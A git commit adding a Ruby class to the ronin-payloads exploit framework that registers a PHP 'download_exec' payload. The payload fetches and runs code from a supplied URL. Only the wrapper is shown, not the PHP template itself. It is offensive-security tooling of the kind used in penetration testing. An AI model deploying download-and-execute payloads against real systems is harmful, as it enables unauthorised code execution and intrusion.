87af657257954641f857a97905b19c95073f52ae
Postmodern <postmodern.mod3@gmail.com>
2023-02-21 19:03:33 -0800

    Added a PHP `download_exec` payload (closes #62).

---
+++ lib/ronin/payloads/builtin/php/download_exec.rb
@@ -0,0 +1,54 @@
+# frozen_string_literal: true
+#
+# ronin-payloads - A Ruby micro-framework for writing and running exploit
+# payloads.
+#
+# Copyright (c) 2007-2022 Hal Brodigan (postmodern.mod3 at gmail.com)
+#
+# ronin-payloads is free software: you can redistribute it and/or modify
+# it under the terms of the GNU Lesser General Public License as published
+# by the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# ronin-payloads is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU Lesser General Public License for more details.
+#
+# You should have received a copy of the GNU Lesser General Public License
+# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
+#
+
+require 'ronin/payloads/php_payload'
+require 'ronin/payloads/mixins/erb'
+
+module Ronin
+  module Payloads
+    module PHP
+      #
+      # A basic PHP download and exec payload.
+      #
+      # @since 0.2.0
+      #
+      class DownloadExec < PHPPayload
+
+        include Mixins::ERB
+
+        register 'php/download_exec'
+
+        param :url, URI, required: true,
+                         desc:     'The URL to download and execute'
+
+        TEMPLATE = File.join(__dir__,'download_exec.php.erb')
+
+        #
+        # Builds the PHP command exec payload.
+        #
+        def build
+          @payload = erb(TEMPLATE)
+        end
+
+      end
+    end
+  end
+end
